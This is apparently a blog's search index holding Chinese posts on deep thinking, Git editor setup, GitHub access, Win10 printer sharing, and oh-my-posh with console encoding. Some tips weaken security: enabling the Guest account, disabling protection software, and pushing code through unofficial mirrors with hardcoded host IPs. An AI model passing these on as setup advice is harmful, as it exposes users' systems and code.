<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>深度思考，拯救低效勤奋</title>
      <link href="2021/07/30/shen-du-si-kao-zheng-jiu-di-xiao-qin-fen/"/>
      <url>2021/07/30/shen-du-si-kao-zheng-jiu-di-xiao-qin-fen/</url>
      
        <content type="html"><![CDATA[<h3 id="深度思考，拯救低效勤奋"><a href="#深度思考，拯救低效勤奋" class="headerlink" title="深度思考，拯救低效勤奋"></a>深度思考，拯救低效勤奋</h3><p>众所周知，勤奋是一种很好的品质，我们想要做成一件事，达成一个好的结果，往往都离不开这种品质。</p><p>但是，勤奋是有前提条件的，若是大的前提出现了问题，那么再勤奋往往也没有任何价值。</p><p>比如说，我们都知道的「拔苗助长」这个故事。</p><p>故事中的主人公算是很勤奋的，在田地里忙活了一整天，但因为他违背了禾苗生长的自然规律，结果就是再勤奋，也没有用，反而损失惨重。</p><p>那么，勤奋的前提条件是什么呢？</p><p>答案是：深度思考。</p><p><strong>有价值、有效的勤奋和努力，往往都建立在深度思考之上，没有深度思考的勤奋，通常都在做无用功。</strong></p><p>今天这篇文章就来聊一聊「深度思考」这个问题。</p><h3 id="01-不愿深度思考，难怪你混的不好"><a href="#01-不愿深度思考，难怪你混的不好" class="headerlink" title="01 不愿深度思考，难怪你混的不好"></a><strong>01</strong> <strong>不愿深度思考，难怪你混的不好</strong></h3><p>张三和李四相约一起进山里砍柴。</p><p>为了第二天能早点到山里，张三在前天晚上早早地就睡下了，而李四睡的则较晚一些，因为他花了点时间将斧子给磨了下。</p><p>第二天早上，张三很早就进了山里，一刻也不停歇，使出浑身力气砍柴，毕竟多砍一捆就能多一点收入。</p><p>等李四到山上的时候，张三已经砍好了两捆，虽然来得迟一些，但李四的速度很快，一会功夫就超过了张三。</p><p>到了中午，李四停下来磨斧子，他招呼张三也停下来休息一会，建议他将斧子磨一磨，再砍也不迟。</p><p>张三没理他，心里寻思着，我才不浪费时间，有这休息的功夫，我还可以多砍一些。</p><p>傍晚下山的时候，李四砍的柴捆数量足足是张三的两倍。</p><p>在接下来的几天里，每天都是这样的结果，李四虽然去的比较晚，而且还总是停下来休息，甚至中途还去摘一些果子带回去给孩子，但砍柴的数量却总是比张三多出不少。</p><p>张三就很费解，他问李四：我每天这么努力，起早贪黑地干，连休息的时间都没有，可为什么就是干不过你呢？</p><p>李四说，砍柴除了技术和力气，我们手里的斧子也很重要，我经常磨刀，刀锋锋利，自然就会砍的快一些，也更省力，你从来不磨刀，斧头越来越钝，当然既费力又砍的少了。</p><p>这就是「磨刀不误砍柴工」的故事，虽然很多人都知道这个经典的故事，也都理解其中的道理，但往往也仅仅是知道而已。</p><p>为什么这么说呢？</p><p>因为他们压根就没有从中吸取到教训，仍然在干着和张三一样的事：<strong>低效勤奋</strong>。</p><p>很多人看上去真的很勤奋，很努力，很能吃苦耐劳，但所取得的成绩却总是不太理想，付出和收获不成正比。</p><p>通常情况下，这种「忙而无获」最本质的原因，其实就是勤奋的很低效，甚至是无效。</p><p>之所以会出现这样的情况，原因往往就是缺少深度思考，而庸者和强者，普通人和精英之间的差距，往往也就在这里。</p><h3 id="02-思考的深度，决定你的高度"><a href="#02-思考的深度，决定你的高度" class="headerlink" title="02 思考的深度，决定你的高度"></a><strong>02</strong> <strong>思考的深度，决定你的高度</strong></h3><p>说了这么多，很多人的心里可能会有两个问题</p><h4 id="1-什么是深度思考？"><a href="#1-什么是深度思考？" class="headerlink" title="1. 什么是深度思考？"></a><strong>1. 什么是深度思考？</strong></h4><h4 id="2-如何才能做到深度思考？"><a href="#2-如何才能做到深度思考？" class="headerlink" title="2. 如何才能做到深度思考？"></a><strong>2. 如何才能做到深度思考？</strong></h4><p>先来看第一个问题：什么是深度思考？</p><p>曾担任香奈儿全球CEO，被称为「新一代香奈儿女王」的<strong>莫琳·希凯</strong>写过一本书《深度思考：不断逼近问题的本质》。</p><p>所谓「深度思考」，其实就是一种不断逼近问题本质的行为，对问题挖得越深，就越接近真相。</p><p>所以，如果想要彻底解决问题，想要努力的有价值，那么深度思考就是必不可少的一个环节。</p><p>再来看第二个问题：如何才能做到深度思考？</p><p>有三个必要的条件。</p><h5 id="1-独处"><a href="#1-独处" class="headerlink" title="1. 独处"></a><strong>1. 独处</strong></h5><p>没有一定的独处能力，那么就很难有「深度思考」的可能性，这是想要做到深度思考的第一个必要条件。</p><p>在《乌合之众》里有这样一句话：</p><p><strong>人一到群体中，智商就严重降低，为了获得认同，个体愿意抛弃是非，用智商去换取那份让人备感安全的归属感。</strong></p><p>简单来讲，就是人在群体中往往就失去了思考的能力，而这就是我们为什么要有独处能力的原因。</p><p><strong>很多问题和事情，需要我们静下心来去好好思量，好好想想的，心越静，思想往往就越深邃。</strong></p><h5 id="2-知识"><a href="#2-知识" class="headerlink" title="2. 知识"></a><strong>2. 知识</strong></h5><p>独处是最基础的一个条件，并不是说只要静下心来思考，就一定可以做到对问题的深度思考。</p><p>比如说，在我们考试的时候，不管你再怎么静下心来思考，不会做的题目还是一样不会做。</p><p>所以，想要做到深度思考的第二个必要条件，就是要有一定的知识储备来支撑你的思考。</p><p>知识的储备，通常有两个来源，一是经验和阅历，二是看书阅读，这也是我经常说人要多读书，多出去见见世面的原因。</p><p><strong>你的见识越多、越广，知识储备越丰富，往往就越能对问题有深度的思考和认知。</strong></p><h5 id="3-练习"><a href="#3-练习" class="headerlink" title="3. 练习"></a><strong>3. 练习</strong></h5><p>深度思考是一种能力，并不是天赋，既然是能力，那就是说可以通过练习来获取的。</p><p>想要一下子就能达到对问题有深度思考的级别，这是不现实的，除了长年累月的知识储备之外，我们还得刻意练习这种能力。</p><p>遇到问题，多问几个为什么，多从几个角度去看问题，不要迷信权威和唯一的答案，多持怀疑态度。</p><p>这不是神经质，而是通过一次次小的练习来培养思考的习惯，以及思维上的开悟，人的脑子总是越用越灵光的。</p><p><strong>在前行的路上，如果发现自己的努力很低效的话，那么是时候停下来思考思考了，你思考的深度，往往能决定你的人生高度。</strong></p><h3 id="磨刀不误砍柴工，请铭记于心。"><a href="#磨刀不误砍柴工，请铭记于心。" class="headerlink" title="磨刀不误砍柴工，请铭记于心。"></a>磨刀不误砍柴工，请铭记于心。</h3>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反思 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git默认编辑器设置</title>
      <link href="2021/07/30/git-mo-ren-bian-ji-qi-she-zhi/"/>
      <url>2021/07/30/git-mo-ren-bian-ji-qi-she-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="将Git的默认编辑器设置为VS-Code"><a href="#将Git的默认编辑器设置为VS-Code" class="headerlink" title="将Git的默认编辑器设置为VS Code"></a>将Git的默认编辑器设置为VS Code</h2><p>windows用户运行git bash并输入以下代码</p><pre><code>git config --global core.editor &quot;code -w&quot;</code></pre><p>操作步骤</p><pre><code>1.`git reabse -i HEAD~2`合并多个提交时,会默认打开Vscode,2.修改内容并保存,然后关闭3.git会继续打开更改后的内容,无需修改,直接关闭就好了</code></pre>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分析github推送以及访问github慢的原因</title>
      <link href="2021/07/29/fen-xi-github-tui-song-yi-ji-fang-wen-github-man-de-yuan-yin/"/>
      <url>2021/07/29/fen-xi-github-tui-song-yi-ji-fang-wen-github-man-de-yuan-yin/</url>
      
        <content type="html"><![CDATA[<h1 id="分析github推送以及访问github慢的原因"><a href="#分析github推送以及访问github慢的原因" class="headerlink" title="分析github推送以及访问github慢的原因"></a>分析github推送以及访问github慢的原因</h1><h2 id="分析推送慢"><a href="#分析推送慢" class="headerlink" title="分析推送慢"></a>分析推送慢</h2><h3 id="1-github-com服务器在境外-境内访问较慢"><a href="#1-github-com服务器在境外-境内访问较慢" class="headerlink" title="1. github.com服务器在境外,境内访问较慢"></a>1. github.com服务器在境外,境内访问较慢</h3><p>可以采用国内的镜像源做推送,</p><blockquote><p><strong>http镜像</strong></p><p><a href="https://github.com.cnpmjs.org" target="_blank" rel="noopener">https://github.com.cnpmjs.org</a></p><p>举例:<a href="https://github.com.cnpmjs.org/fhefh2015/Fast-GitHub.git" target="_blank" rel="noopener">https://github.com.cnpmjs.org/fhefh2015/Fast-GitHub.git</a></p><p><strong>ssh镜像</strong></p><p>git.zhlh6.cn</p><p>举例:<a href="mailto:git@git.zhlh6.cn" target="_blank" rel="noopener">git@git.zhlh6.cn</a>:fhefh2015/Fast-GitHub.git</p></blockquote><p>更换前</p><p><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210730101231970.png" alt="image-20210730101231970"></p><p>更换后</p><p><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210730101314358.png" alt="image-20210730101314358"></p><p>​    2.更换源步骤</p><pre><code>1. git remote -vv //查看本地仓库源❯ git remote -vvorigin  git@github.com:lexxxg/cxxx.git (fetch)origin  git@github.com:lexxxg/cxxx.git (push)2. git remote rm origin   //删除该分支3. git remote add origin git@git.zhlh6.cn:lexxxg/cxxx.git//将其中github.com替换为git.zhlh6.cn4. git remote -vv //再次查看本地仓库源❯ git remote -vvorigin  git@github.com.cnpmjs.org:lexxxg/cxxx.git (fetch)origin  git@github.com.cnpmjs.org:lexxxg/cxxx.git (push)</code></pre><p><strong>恭喜你可以愉快地使用github clone 和 推送了</strong></p><h2 id="分析访问慢"><a href="#分析访问慢" class="headerlink" title="分析访问慢"></a>分析访问慢</h2><h3 id="1-国内访问-GitHub-为什么很慢？"><a href="#1-国内访问-GitHub-为什么很慢？" class="headerlink" title="1.国内访问 GitHub 为什么很慢？"></a>1.国内访问 GitHub 为什么很慢？</h3><p>GitHub的CDN域名遭到DNS污染，导致无法连接使用 GitHub 的加速分发服务器，才使得国内访问速度很慢。</p><h3 id="2-如何解决-DNS-污染？"><a href="#2-如何解决-DNS-污染？" class="headerlink" title="2.如何解决 DNS 污染？"></a>2.如何解决 DNS 污染？</h3><p>通过修改 Hosts 文件，将域名解析直接指向 IP 地址来绕过 DNS 的解析，以此解决污染问题。</p><h3 id="3-具体步骤"><a href="#3-具体步骤" class="headerlink" title="3.具体步骤"></a>3.具体步骤</h3><p>1、获取Github的ip地址</p><p>通过访问 <a href="https://www.ipaddress.com/" target="_blank" rel="noopener">https://www.ipaddress.com/</a> 这个网站来获取当前github最新的ip地址。</p><p><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210730102334400.png" alt="image-20210730102334400"></p><p><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210730102427017.png" alt="image-20210730102427017"></p><ol start="2"><li>修改 host 文件  位置:C:\Windows\System32\drivers\etc   </li></ol><blockquote><p>192.30.253.112      github.com<br>192.30.253.113      github.com<br>151.101.185.194     github.global.ssl.fastly.net</p></blockquote><ol start="3"><li>更新dns缓存</li></ol><blockquote><p>ipconfig /flushdns</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gihub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Gihub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10局域网机共享教程（内含详细图文）</title>
      <link href="2021/06/30/win10-ju-yu-wang-ji-gong-xiang-jiao-cheng-nei-han-xiang-xi-tu-wen/"/>
      <url>2021/06/30/win10-ju-yu-wang-ji-gong-xiang-jiao-cheng-nei-han-xiang-xi-tu-wen/</url>
      
        <content type="html"><![CDATA[<h3 id="Win10局域网机共享教程（内含详细图文）"><a href="#Win10局域网机共享教程（内含详细图文）" class="headerlink" title="Win10局域网机共享教程（内含详细图文）"></a>Win10局域网机共享教程（内含详细图文）</h3><p>本文将详细介绍Win7下如何实现同个局域网内共享机。经测试，Win10/Win7/XP之间均可正常连接。</p><p><strong>第一步：取消禁用Guest用户</strong></p><ol><li>点击【开始】按钮，在【计算机】上右键，选择【管理】，如下图所示：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630224804060.png" alt="image-20210630224804060"></p><ol start="2"><li>在弹出的【计算机管理】在本地用户和组列表中找到【Guest】用户，如下图所示：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630224841758.png" alt="image-20210630224841758"></p><ol start="3"><li>双击【Guest】，打开【Guest属性】窗口，确保【账户已禁用】选项没有被勾选，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630224906839.png" alt="image-20210630224906839"></p><p><strong>第二步：共享目标打印机</strong></p><ol><li>快捷键【win I】，选择【设备】，选择设备与打印机，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630224931869.png" alt="image-20210630224931869"></p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225028057.png" alt="image-20210630225028057"></p><ol start="2"><li>在弹出的窗口中找到想共享的打印机（前提是打印机已正确连接，驱动已正确安装），在该打印机上右键，选择【打印机属性】，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225057126.png" alt="image-20210630225057126"></p><ol start="3"><li>切换到【共享】选项卡，勾选【共享这台打印机】，并且设置一个共享名（请记住该共享名，后面的设置可能会用到），如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225123914.png" alt="image-20210630225123914"></p><p><strong>第三步：进行高级共享设置</strong></p><ol><li>在右下角系统托盘的网络连接图标上右键，选择【打开网络和共享中心】，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225218318.png" alt="image-20210630225218318"></p><ol start="2"><li>单击列表中的【更改高级共享设置】，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225246235.png" alt="image-20210630225246235"></p><ol start="3"><li>具体设置可参考下图，其中的关键选项已经用红圈标示，设置完成后不要忘记保存修改。</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225306913.png" alt="image-20210630225306913"></p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225334666.png" alt="image-20210630225334666"></p><p>注意：如果是工作或专用网络，具体设置和上面的情况类似，相应地应该设置选项，如下图：　</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225354701.png" alt="image-20210630225354701"></p><p><strong>第四步：设置工作组</strong></p><p>　　在添加目标打印机之前，首先要确定局域网内的计算机是否都处于一个工作组，具体过程如下：</p><ol><li>点击【开始】按钮，在【计算机】上右键，选择【属性】，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225414293.png" alt="image-20210630225414293"></p><ol start="2"><li>在弹出的窗口中找到工作组，如果计算机的工作组设置不一致，请点击【更改设置】；如果一致可以直接退出，跳到第五步。</li></ol><p>　　注意：请记住【计算机名】，后面的设置会用到。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225652231.png" alt="image-20210630225652231"></p><p><strong>win10更新后在这里</strong></p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225606238.png" alt="image-20210630225606238"></p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225638892.png" alt="image-20210630225638892"></p><ol start="3"><li>如果处于不同的工作组，可以在此窗口中进行设置：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225821540.png" alt="image-20210630225821540"></p><p>注意：此设置要在重启后才能生效，所以在设置完成后不要忘记重启一下计算机，使设置生效。</p><p><strong>第五步：在其他计算机上添加目标打印机</strong></p><p>　　注意：此步操作是在局域网内的其他需要共享打印机的计算机上进行的。此步操作在Win7和XP系统中的过程是类似的，本文以Win10为例进行介绍。</p><p>　　添加的方法有多种，在此为小编只介绍两种。</p><p>　　首先，无论使用哪种方法，都应先进入【控制面板】{（Win X） P}，打开【设备和打印机】窗口，并点击【添加打印机】，如下图：</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225847013.png" alt="image-20210630225847013"></p><p>系统会自动搜索可用的打印机。</p><p>　　如果前面的几步设置都正确的话，那么只要耐心一点等待，一般系统都能找到，接下来只需跟着提示一步步操作就行了。</p><p>　　原谅小编机器也没找到…可直接点击【我所需的打印机未列出】，然后点击【下一步】，如下图：</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225911685.png" alt="image-20210630225911685"></p><p>　接下来的设置就有多种方法了。</p><p>　　第一种方法：</p><p>　　1. 选择【按名称选择共享打印机】，点击【下一步】，如下图：</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225928590.png" alt="image-20210630225928590"></p><ol start="2"><li>找到连接着打印机的计算机，点击【选择】，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630225947497.png" alt="image-20210630225947497"></p><ol start="3"><li>选择目标机器（打印机名就是在第二步中设置的名称），点击【选择】，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230005463.png" alt="image-20210630230005463"></p><p>接下来的操作比较简单，系统会自动找到并把该打印机的驱动安装好。至此，打印机已成功添加。</p><p>　　<strong>第二种方法：</strong></p><p>　　1.  在【添加打印机】窗口选择【按名称选择共享打印机】，直接输入“\计算机名\打印机名”（计算机名和打印机在上文中均有提及，不清楚的朋友往上翻）。如果前面的设置正确的话，当还输入完系统就会给出提示（如下图）。</p><p>　　接着点击【下一步】。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230023632.png" alt="image-20210630230023632"></p><p>注意：如果此步操作中系统没有自动给出提示，那么很可能直接点击【下一步】会无法找到目标打印机，此时我们可以把“计算机名”用“IP”来替换，如下：</p><p>　　例如小编主机IP为192.168.21.170，那么则应输入“\\192.168.21.170\Sharp MX-M350U PCL 6”。查看系统IP的方法如下：</p><p>1.1 系统托盘【网络】图标上右键，选择【打开网络和共享中心】，如下图：</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230051514.png" alt="image-20210630230051514"></p><p>1.2 在【网络和共享中心】找到【本地连接】，单击，如下图：</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230108796.png" alt="image-20210630230108796"></p><p>1.3 在弹出的【本地连接 状态】窗口中点击【详细信息】，IPv4 地址就是本机的IP地址。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230125452.png" alt="image-20210630230125452"></p><p>当然你也可以直接通过快捷键“win R—&gt;cmd—&gt;ipconfig/all”来查看。</p><ol start="2"><li>接下来继续前面的步骤，和第一种方法一样，系统会找到该设备并安装好驱动，只需耐性等待即可（如下图）。</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230147231.png" alt="image-20210630230147231"></p><ol start="3"><li>接着系统会给出提示，告诉用户打印机已成功添加，直接点击【下一步】，如下图：</li></ol><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230205106.png" alt="image-20210630230205106"></p><ol start="4"><li>至此，打印机已添加完毕，如有需要用户可点击【打印测试页】，测试一下打机是否能正常工作，也可以直接点击【完成】退出此窗口，如下图：<img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230225195.png" alt="image-20210630230225195"></li></ol><p>成功添加后，在【控制面板】的【设备和打印机】窗口中，可以看到新添加的打印机，如下图：</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630230301813.png" alt="image-20210630230301813"></p><p>至此，整个过程均已完成，没介绍的其他方法（使用TCP/IP地址或主机名添加打印机）也比较简单，过程类似，这里不想赘述。</p><p>　　如果有朋友在第四步的设置中无法成功，那么很有可能是防护软件的问题，可对防护软件进行相应的设置或把防护软件关闭后再尝试添加。</p><p>　　最后，希望本文对壳粉们有所帮助。</p><p>　　PS：有不明白或遇到问题的朋友可以给我留言，反正小编也不会回复你。</p>]]></content>
      
      
      <categories>
          
          <category> 打印机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10安装Windows Terminal + oh-my-posh</title>
      <link href="2021/06/26/windows10-an-zhuang-windows-terminal-omyzsh/"/>
      <url>2021/06/26/windows10-an-zhuang-windows-terminal-omyzsh/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows10安装Windows-Terminal-oh-my-posh"><a href="#Windows10安装Windows-Terminal-oh-my-posh" class="headerlink" title="Windows10安装Windows Terminal + oh-my-posh"></a>Windows10安装Windows Terminal + oh-my-posh</h1><p>各位 Windows 开发者，是不是很羡慕他们 Linux 和 mac 用户的 terminal 在配置过 oh-my-zsh 之后变得非常漂亮？现在不用羡慕了，因为你的 Powershell 也可以变得非常漂亮</p><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><h4 id="1-步骤一"><a href="#1-步骤一" class="headerlink" title="1. 步骤一"></a>1. 步骤一</h4><p>首先得为 Powershell 安装必要的插件，安装这些插件需要管理员权限，所以别忘了以管理员身份启动 Powershell。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 为当前用户安装 posh-git</span>Install<span class="token operator">-</span>Module posh<span class="token operator">-</span>git <span class="token operator">-</span>Scope CurrentUser<span class="token comment" spellcheck="true"># 为当前用户安装 oh-my-posh</span>Install<span class="token operator">-</span>Module oh<span class="token operator">-</span>my<span class="token operator">-</span>posh <span class="token operator">-</span>Scope CurrentUser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-添加配置文件"><a href="#2-添加配置文件" class="headerlink" title="2.添加配置文件"></a>2.添加配置文件</h4><p>然后打开PowerShell配置文件，这个文件你可以通过<code>notepad $PROFILE</code>命令打开编辑，当然<code>notepad</code>也可以换成你自己常用的文本编辑器。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210626111556535.png" alt="image-20210626111556535"></p><p>如果没有可以<strong>拷贝下面的内容 并且 更改文件名</strong>为<code>Microsoft.PowerShell_profile.ps1</code></p><pre class="line-numbers language-shell"><code class="language-shell">Import-Module posh-git # 引入 posh-gitImport-Module oh-my-posh # 引入 oh-my-poshSet-PoshPrompt -Theme Paradox # 设置主题为 Paradox#Set-PSReadLineOption -PredictionSource History # 设置预测文本来源为历史记录Set-PSReadlineKeyHandler -Chord Tab -Function Complete # 设置 Tab 键补全Set-PSReadLineKeyHandler -Chord Ctrl+d -Function MenuComplete # 设置 Ctrl+d 为菜单补全和 IntellisenseSet-PSReadLineKeyHandler -Chord Ctrl+z -Function Undo # 设置 Ctrl+z 为撤销Set-PSReadLineKeyHandler -Chord Ctrl+u -Function RevertLine # 设置 Ctrl+u 为重置行Set-PSReadLineKeyHandler -Chord UpArrow -Function HistorySearchBackward # 设置向上键为后向搜索历史记录Set-PSReadLineKeyHandler -Chord DownArrow -Function HistorySearchForward # 设置向下键为前向搜索历史纪录# Chocolatey profile$ChocolateyProfile = "$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"if (Test-Path($ChocolateyProfile)) {  Import-Module "$ChocolateyProfile"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中快捷键的设置可以根据自己需要随意配置，具体文档看这 <a href="https://docs.microsoft.com/en-us/powershell/module/psreadline/?view=powershell-7.1" target="_blank" rel="noopener">PSReadLine</a></p><p>然后关闭powershell再次重新打开</p><h4 id="3-安装字体"><a href="#3-安装字体" class="headerlink" title="3.安装字体"></a>3.安装字体</h4><p>oh-my-posh 和 oh-my-zsh 一样，需要一套带各种图标的等宽字体才能正常的显示，所以我们现在该去安装字体了。</p><p>对于字体，你可以有以下几种选择方案：</p><ul><li>直接按教程来，使用<code>Cascadia Code PL</code>字体，字体可以在<a href="https://github.com/microsoft/cascadia-code/releases" target="_blank" rel="noopener">这里</a>下载</li><li>或者在 <a href="https://www.nerdfonts.com/" target="_blank" rel="noopener">Nerd Fonts</a> 这个网站中下载字体，这个网站的字体几乎都是为了开发定制的</li></ul><p>安装好之后右键 Powershell 的菜单栏，打开<code>属性 -&gt; 字体</code>，把字体设置为上面安装的字体之后就可以了。</p><h2 id="安装-Windows-Terminal"><a href="#安装-Windows-Terminal" class="headerlink" title="安装 Windows Terminal"></a>安装 Windows Terminal</h2><p>巨硬新款终端，帅气又漂亮，安装也非常简单，打开 <a href="https://www.microsoft.com/zh-cn/p/windows-terminal/9n0dx20hk701?activetab=pivot:overviewtab" target="_blank" rel="noopener">Microsoft Store</a> 直接搜索 Windows Terminal 然后安装就行了，至于 Windows Terminal 本身的配置的话，截至本文发布时间，已经可以支持界面化设置，不用再直接修改配置文件了，所以对于设置就不过多赘述了。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210626111803571.png" alt="image-20210626111803571"></p><h4 id="4-可能会出现的情况"><a href="#4-可能会出现的情况" class="headerlink" title="4.可能会出现的情况"></a>4.可能会出现的情况</h4><p>powershell中文乱码<img src="C:%5CUsers%5C58387%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210626112340986.png" alt="image-20210626112340986"></p><p>解决方案</p><p>cmd 控制台默认编码，一般是简体中文默认的GBK，如果出现中文乱码，一般改为UTF-8可解决。</p><h5 id="打开-cmd-控制台窗口"><a href="#打开-cmd-控制台窗口" class="headerlink" title="打开 cmd 控制台窗口"></a>打开 cmd 控制台窗口</h5><p>win（窗口键，在Ctrl与Alt之间）+R，输入 cmd，回车，这样操作会打开 cmd 控制台窗口。</p><h5 id="检查当前的编码"><a href="#检查当前的编码" class="headerlink" title="检查当前的编码"></a>检查当前的编码</h5><pre><code>C:\Users\AndyChen&gt;chcpActive code page: 936</code></pre><p>显示当家的编码格式为 936。</p><h5 id="常用的编码及对应的码值-10进制"><a href="#常用的编码及对应的码值-10进制" class="headerlink" title="常用的编码及对应的码值(10进制)"></a>常用的编码及对应的码值(10进制)</h5><table><thead><tr><th align="left">十进制码值</th><th align="left">对应编码名称</th></tr></thead><tbody><tr><td align="left">950</td><td align="left">繁体中文</td></tr><tr><td align="left">65001</td><td align="left">Unicode (UTF-8)</td></tr><tr><td align="left">936</td><td align="left">简体中文默认的GBK</td></tr><tr><td align="left">437</td><td align="left">MS-DOS 美国英语</td></tr></tbody></table><h5 id="测试中文显示"><a href="#测试中文显示" class="headerlink" title="测试中文显示"></a>测试中文显示</h5><p>将以下代码保存为一个批处理文件，如 test.bat，或者 test.cmd，双击运行</p><pre><code>@echo offecho test chinese character view  测试中文字符显示pause</code></pre><p>我的测试如下：</p><pre><code>test chinese character view  娴嬭瘯涓枃瀛楃鏄剧ずPress any key to continue . . .</code></pre><p>当为936时，中文显示乱码。</p><h5 id="修改控制台CMD编码格式为UTF-8"><a href="#修改控制台CMD编码格式为UTF-8" class="headerlink" title="修改控制台CMD编码格式为UTF-8"></a>修改控制台CMD编码格式为UTF-8</h5><h5 id="临时修改为-UTF-8"><a href="#临时修改为-UTF-8" class="headerlink" title="临时修改为 UTF-8"></a>临时修改为 UTF-8</h5><p>执行 <code>chcp 65001</code></p><pre><code>C:\Users\AndyChen&gt;chcp 65001Active code page: 65001</code></pre><p>这种方式在关闭 cmd 之后会自动失效，下次再打开，还是会变回默认的 936。</p><h5 id="永久修改方法一"><a href="#永久修改方法一" class="headerlink" title="永久修改方法一"></a>永久修改方法一</h5><ol><li><p>win+R 或者点击开始菜单，找到运行，在运行输入框里面输入</p><pre><code>regedit</code></pre><p>，回车，会打开注册码编辑窗口，在地址栏输入：</p><pre><code>Computer\HKEY_CURRENT_USER\Console\%SystemRoot%_System32_cmd.exe</code></pre><p>，回车。</p><p><img src="https://www.lovesofttech.com/img/general/cmd-chinese-character-01.png" alt="img"></p></li><li><p>双击</p></li></ol><pre><code>   CodePage</code></pre><p>   然后先择十进制，改为65001。</p><p>   <img src="https://www.lovesofttech.com/img/general/cmd-chinese-character.png" alt="img"></p><ol start="3"><li>同理，可以修改 PowerShell 的默认编码，位置：<code>Computer\HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe</code>，如果没有 <code>CodePage</code>，则在该项下新建一个 DWORD（32位值），命名为<code>CodePage</code>，值设为<code>65001</code></li></ol><p>重启 cmd/PowerShell 后生效。</p><h5 id="永久修改方法二"><a href="#永久修改方法二" class="headerlink" title="永久修改方法二"></a>永久修改方法二</h5><p>创建文本文件 characterSet.reg，内容如下：</p><pre><code>Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\Console\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe]&quot;CodePage&quot;=dword:0000fde9[HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe]&quot;CodePage&quot;=dword:0000fde9[HKEY_CURRENT_USER\Console\%SystemRoot%_System32_cmd.exe]&quot;CodePage&quot;=dword:0000fde9</code></pre><p>双击运行。</p><h5 id="再次测试中文显示"><a href="#再次测试中文显示" class="headerlink" title="再次测试中文显示"></a>再次测试中文显示</h5><p>运行之前的测试脚本，显示如下：</p><pre><code>test chinese character view  测试中文字符显示Press any key to continue . . .</code></pre><p>能够正常显示，说明设置成功。</p>]]></content>
      
      
      <categories>
          
          <category> oh-my-posh </category>
          
      </categories>
      
      
        <tags>
            
